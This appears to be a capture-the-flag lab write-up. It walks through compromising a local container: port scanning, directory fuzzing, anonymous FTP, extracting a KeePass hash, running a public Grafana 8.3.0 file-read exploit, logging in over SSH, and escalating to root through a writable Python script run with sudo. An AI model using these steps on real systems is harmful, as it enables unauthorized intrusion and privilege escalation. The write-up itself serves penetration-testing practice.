![image](https://github.com/user-attachments/assets/5aeeff3d-98f1-4b30-b5f1-3023544c972f)

We test the connection with the victim machine
```bash
ping -c 1 172.17.0.2
```
![image](https://github.com/user-attachments/assets/daa8b535-5c35-48f1-9480-41ac4c93f05c)

    ttl =64 ==> linux OS

## **As the victim machine is within reach, we will send a request for a response with the ports that are open.**

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
```
![image](https://github.com/user-attachments/assets/c525eb41-4e8a-4a9a-b7f3-641906f1ed77)

    -oG AllPorts = save the output in the AllPorts file.

## **Now we launch a port scan**

```bash
nmap -sCV -p21,22,80,3000 172.17.0.2 -oN targeted
```
![image](https://github.com/user-attachments/assets/16069e6e-a237-472d-9164-09a792d99da0)

        -oN targeted = save the output in the targeted file.

## **We will apply fuzzing to discover new directories.**
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh,html,js
```

## **We found this

![image](https://github.com/user-attachments/assets/1a43b527-a6a8-4f42-ac2f-74ba0d140919)
![image](https://github.com/user-attachments/assets/a84f31d8-5011-40c2-9aae-d2108ee249b3)

## **We have a clue that tells us that the access would be in the address found, but we do not have access to it, but we still have an access by FPT in Port 21 since the anonymous user is active.**

```bash
ftp 172.17.0.2
```
![image](https://github.com/user-attachments/assets/d3f9b147-7057-45e6-aedc-f24dcbcf7779)
![image](https://github.com/user-attachments/assets/71ddd691-bb05-413a-b61c-a5785c6ac1d2)
![image](https://github.com/user-attachments/assets/c556c458-a2b0-4f66-94e1-ec7734fde2bc)

## **We will try to decrypt this file since it is a keepass database (DATABASE.kdbx).**
```bash
keepass2john database.kdbx > hash_database
```
![image](https://github.com/user-attachments/assets/ef81b728-e685-4995-a773-24b620ebcca2)

## **We do not have a way by this method so we will continue to investigate the web.**
```bash
whatweb http://172.17.0.2:3000/login
```
![image](https://github.com/user-attachments/assets/1b52be59-8ec5-4c2d-a295-2d02c4257589)

```bash
searchsploit Grafana 8.3.0
```
![image](https://github.com/user-attachments/assets/1cc42446-de5e-4758-b185-0260905b8ef5)

## **We bring the exploit to our working folder**
```bash
locate 50581.py
```
```bash
mv /usr/share/exploitdb/exploits/multiple/webapps/50581.py .
```
![image](https://github.com/user-attachments/assets/6713e0b1-7d88-442f-867e-ef10c611064f)

## **With this new exploit we will start our attack on the website**
```bash
python3 50581.py -H http://172.17.0.2:3000
```
![image](https://github.com/user-attachments/assets/53cd3a27-a917-4dee-abfd-441e580703b0)

## **Now we have a username and password let's try to login via SSH**
```bash
ssh freddy@172.17.0.2
```
![image](https://github.com/user-attachments/assets/4c4ce804-d551-4db4-a11b-bc663714a801)

## **We already have access now let's try to elevate privileges**
```bash
sudo -l
```
![image](https://github.com/user-attachments/assets/99c5b875-47fd-47be-9b3d-c2f31384c21a)
![image](https://github.com/user-attachments/assets/7d90a92a-2d38-4216-8883-a907c042e7fb)

## **We see that /opt/maintenance.py belongs to freddy so we can change it and write to it. The new content of the maintenance.py script will be:**
```bash
script /dev/null -c bash
"CTRL+Z"
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```
```bash
nano /opt/maintenance.py
```
![image](https://github.com/user-attachments/assets/5b9a60c7-daa2-4800-99db-20d93413e729)
```bash
import os
os.system("/usr/bin/python3 -c 'import os; os.system(\"/bin/bash\")'")
```
![image](https://github.com/user-attachments/assets/5e3d535d-468c-4247-acba-6564fae86b4b)

## **We execute it:**
```bash
sudo /usr/bin/python3 /opt/maintenance.py
```
![image](https://github.com/user-attachments/assets/86397e0c-ea6d-468c-a8ba-b97806a23360)







